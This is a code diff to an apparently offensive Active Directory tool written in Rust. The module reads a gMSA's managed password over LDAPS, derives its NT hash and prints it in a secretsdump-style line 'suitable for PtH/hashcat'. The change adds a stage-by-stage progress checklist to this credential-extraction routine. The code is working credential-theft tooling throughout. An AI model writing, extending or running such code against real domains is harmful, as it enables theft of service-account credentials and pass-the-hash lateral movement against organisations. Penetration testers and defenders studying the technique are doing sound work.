@@ -1,6 +1,7 @@
 //! gMSA managed-password read: LDAPS-sealed msDS-ManagedPassword →
 //! MD4 → NT hash suitable for PtH/hashcat.
 
+use crate::ui;
 use anyhow::{Context, Result};
 use clap::Parser;
 
@@ -20,11 +21,44 @@ pub(crate) struct GmsaArgs {
     pub target: String,
 }
 
-/// Read a gMSA's managed password over LDAP and derive its NT hash. The managed password is a
-/// constructed attribute the DC returns only over a sealed channel (LDAPS here) to principals in
-/// `msDS-GroupMSAMembership`. Output is PtH/hashcat-usable.
-pub(crate) async fn gmsa(mut a: GmsaArgs) -> Result<()> {
+/// Read a gMSA's managed password over LDAP and derive its NT hash. Wraps `gmsa_impl` with a rich
+/// per-stage checklist ("resolve password → sealed LDAP bind → read msDS-ManagedPassword → derive
+/// NT hash") so the operator sees where the pipeline stopped (bad channel, bad ACL, not a gMSA).
+pub(crate) async fn gmsa(a: GmsaArgs) -> Result<()> {
+    let mut checklist = ui::StageChecklist::new([
+        "resolve password",
+        "sealed LDAP bind (LDAPS)",
+        "read msDS-ManagedPassword",
+        "derive NT hash",
+    ]);
+    let result = gmsa_impl(a, &mut checklist).await;
+    match &result {
+        Ok(()) => checklist.render("gMSA stages"),
+        Err(e) => {
+            let brief = format!("{e:#}")
+                .lines()
+                .next()
+                .unwrap_or("failed")
+                .chars()
+                .take(80)
+                .collect::<String>();
+            checklist.mark_current_failed(brief);
+            checklist.render("gMSA stages (failed)");
+        }
+    }
+    result
+}
+
+async fn gmsa_impl(mut a: GmsaArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
     a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
+    checklist.record_ok(
+        "resolve password",
+        if a.password.is_empty() {
+            "empty"
+        } else {
+            "resolved"
+        },
+    );
     use adhammer_collector::{Collector, LdapConfig};
     // msDS-ManagedPassword is a "confidential" attribute — AD returns it *only* over an
     // encrypted channel (LDAPS or sealed SASL). Fail fast with a clear message rather than
@@ -45,6 +79,7 @@ pub(crate) async fn gmsa(mut a: GmsaArgs) -> Result<()> {
         gssapi: false,
     };
     let mut c = Collector::connect(&cfg).await?;
+    checklist.record_ok("sealed LDAP bind (LDAPS)", format!("→ {}", a.url));
     let blob = c
         .read_attr_bin(&a.target, "msDS-ManagedPassword")
         .await
@@ -62,10 +97,18 @@ pub(crate) async fn gmsa(mut a: GmsaArgs) -> Result<()> {
                 a.target
             )
         })?;
+    checklist.record_ok(
+        "read msDS-ManagedPassword",
+        format!("{} bytes (BLOB)", blob.len()),
+    );
     let pw =
         crate::parse_managed_password_blob(&blob).context("parse MSDS-MANAGEDPASSWORD_BLOB")?;
     let nt = ntlmssp::md4(&pw);
     let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
+    checklist.record_ok(
+        "derive NT hash",
+        format!("MD4 → {}…", &nthex[..8.min(nthex.len())]),
+    );
     // secretsdump-style line; the RID is unknown here, so print sam + hash.
     println!("{}:aad3b435b51404eeaad3b435b51404ee:{}:::", a.target, nthex);
     eprintln!(
